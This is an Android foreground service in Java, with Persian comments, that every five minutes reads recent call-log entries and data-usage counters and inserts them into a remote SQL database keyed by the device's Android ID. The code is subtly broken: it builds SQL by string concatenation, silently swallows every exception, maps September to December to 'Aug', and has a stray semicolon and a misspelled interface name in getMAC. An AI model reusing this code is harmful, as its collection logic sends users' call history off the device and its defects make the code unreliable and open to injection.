package com.example.foreground;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.NetworkStats;
import android.app.usage.NetworkStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.icu.util.LocaleData;
import android.net.NetworkCapabilities;
import android.net.TrafficStats;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.DayOfWeek;
import java.time.Month;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class foregroundService extends Service {
    Connection connect;
    String ConnectionResult = "";
    Handler handler = new Handler();
    private Runnable runnableCode;
    int timeInterval = 300000; // زمان موردنیاز برای ارسال داده (میلی ثانیه)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Intent intent1 = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent1, 0);
        Notification notification = new NotificationCompat.Builder(this, "ChannelId1")
                .setContentTitle(getString(R.string.foreground_header))
                .setContentText(getString(R.string.foreground_text))
                .setSmallIcon(R.mipmap.ic_launch)
                .setContentIntent(pendingIntent).build();
        startForeground(1, notification);
        runnableCode = new Runnable() {
            @Override
            public void run() {
                sendUsage(); // ارسال مصرف داده
                sendCallHistory(); // ارسال لیست تماس ها
                handler.postDelayed(this, timeInterval);
            }
        };
        handler.post(runnableCode);
        return START_STICKY;
    }

    public String getDeviceId(){
        try{
            return Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        catch(Exception ex){
            return "خالی";
        }
    }

    private void sendCallHistory (){
        ContentResolver cr = getBaseContext().getContentResolver();
        Cursor managedCursor = cr.query(
                CallLog.Calls.CONTENT_URI,
                null,
                CallLog.Calls.DATE + " BETWEEN ? AND ?",
                new String[] {String.valueOf(Calendar.getInstance().getTimeInMillis()-timeInterval), String.valueOf(Calendar.getInstance().getTimeInMillis())},
                CallLog.Calls.DATE + " DESC");
        if(managedCursor != null){
            Calendar calendar = Calendar.getInstance();
            ConnectionHelper connectionHelper = new ConnectionHelper();
            connect = connectionHelper.connectionClass();
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            while(managedCursor.moveToNext()){
                try {
                    if (connect != null) {
                        calendar.setTimeInMillis((Long)Long.valueOf(managedCursor.getString(date)));
                        String query = "INSERT INTO CallHistory (MAC, Type, Duration, Hour, DayOfWeek, Day, Month, Year)" +
                                " VALUES ('"
                                + getDeviceId()
                                + "', '"
                                + getCallType(managedCursor.getString(type))
                                + "', '"
                                + managedCursor.getString(duration)
                                + "', '"
                                + (calendar.get(Calendar.HOUR_OF_DAY) + ":" + calendar.get(Calendar.MINUTE) + ":" + calendar.get(Calendar.SECOND))
                                + "', '"
                                + getDayOfWeek(calendar.get(Calendar.DAY_OF_WEEK))
                                + "', '"
                                + calendar.get(Calendar.DAY_OF_MONTH)
                                + "', '"
                                + getMonth(calendar.get(Calendar.MONTH))
                                + "', '"
                                + calendar.get(Calendar.YEAR)
                                + "')";
                        Statement st = connect.createStatement();
                        st.executeQuery(query);
                    } else {
                        Log.d("ERR: ", "Check the connection !");
                    }
                }
                catch(Exception ex){
                }
            }
            managedCursor.close();
        }
    }

    private void sendUsage(){
        try {
            Calendar calendar = Calendar.getInstance();
            ConnectionHelper connectionHelper = new ConnectionHelper();
            connect = connectionHelper.connectionClass();
            if (connect != null) {
                String query = "INSERT INTO Usage (MAC, RxWifi, TxWifi, RxMobile, TxMobile, Hour, DayOfWeek, Month, Year, Day)" +
                        " VALUES ('"
                        + getDeviceId()
                        + "', '"
                        + getWifiRxUsage()
                        + "', '"
                        + getWifiTxUsage()
                        + "', '"
                        + TrafficStats.getMobileRxBytes()
                        + "', '"
                        + TrafficStats.getMobileTxBytes()
                        + "', '"
                        + (calendar.get(Calendar.HOUR_OF_DAY) + ":" + calendar.get(Calendar.MINUTE) + ":" + calendar.get(Calendar.SECOND))
                        + "', '"
                        + getDayOfWeek(calendar.get(Calendar.DAY_OF_WEEK))
                        + "', '"
                        + getMonth(calendar.get(Calendar.MONTH))
                        + "', '"
                        + calendar.get(Calendar.YEAR)
                        + "', '"
                        + calendar.get(Calendar.DAY_OF_MONTH)
                        + "')";
                Statement st = connect.createStatement();
                st.executeQuery(query);
            } else {
                Log.d("ERR: ", "Check the connection !");
            }
        }
        catch(Exception ex){
        }
    }

    public String getDayOfWeek(int day){
        switch(day){
            case 1:
                return "Sunday";
            case 2:
                return "Monday";
            case 3:
                return "Tuesday";
            case 4:
                return "Wednesday";
            case 5:
                return "Thursday";
            case 6:
                return "Friday";
            case 7:
                return "Saturday";
            default:
                return "Saturday";
        }
    }

    public String getCallType(String callType){
        switch(callType){
            case "1":
                return "Incoming";
            case "2":
                return "Outgoing";
            case "3":
                return "Missed";
            default:
                return "Rejected";
        }
    }

    public String getMonth(int month){
        switch(month){
            case 0:
                return "Jan";
            case 1:
                return "Feb";
            case 2:
                return "Mar";
            case 3:
                return "Apr";
            case 4:
                return "May";
            case 5:
                return "Jun";
            case 6:
                return "Jul";
            default:
                return "Aug";
        }
    }

    private void createNotificationChannel() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            NotificationChannel notificationChannel = new NotificationChannel(
                    "ChannelId1", "Foreground notification", NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(notificationChannel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        stopForeground(true);
        stopSelf();
        handler.removeCallbacks(runnableCode);
        super.onDestroy();
    }

    public String getMAC(){
        try{
            List<NetworkInterface> networkInterfaceList = Collections.list(NetworkInterface.getNetworkInterfaces());
            String stringMAC = "";
            for(NetworkInterface networkInterface : networkInterfaceList)
            {
                if(networkInterface.getName().equalsIgnoreCase("wlon0"));
                {
                    for(int i = 0 ;i <networkInterface.getHardwareAddress().length; i++){
                        String stringMacByte = Integer.toHexString(networkInterface.getHardwareAddress()[i]& 0xFF);
                        if(stringMacByte.length() == 1)
                        {
                            stringMacByte = "0" +stringMacByte;
                        }
                        stringMAC = stringMAC + stringMacByte.toUpperCase() + ":";
                    }
                    break;
                }
            }
            return stringMAC;
        } catch (SocketException e) {
            e.printStackTrace();
        }
        return "";
    }

    public long getWifiRxUsage(){
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            NetworkStatsManager networkStatsManager = (NetworkStatsManager) getApplicationContext().getSystemService(Context.NETWORK_STATS_SERVICE);
            NetworkStats.Bucket bucket;
            try {
                bucket = networkStatsManager.querySummaryForUser(NetworkCapabilities.TRANSPORT_WIFI,
                        null,
                        System.currentTimeMillis() - 300000,
                        System.currentTimeMillis());
                return bucket.getRxBytes();
            } catch (Exception e) {
                return -1;
            }
        }
        return -1;
    }

    public long getWifiTxUsage(){
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            NetworkStatsManager networkStatsManager = (NetworkStatsManager) getApplicationContext().getSystemService(Context.NETWORK_STATS_SERVICE);
            NetworkStats.Bucket bucket;
            try {
                bucket = networkStatsManager.querySummaryForUser(NetworkCapabilities.TRANSPORT_WIFI,
                        null,
                        System.currentTimeMillis() - 300000,
                        System.currentTimeMillis());
                return bucket.getTxBytes();
            } catch (Exception e) {
                return -1;
            }
        }
        return -1;
    }
}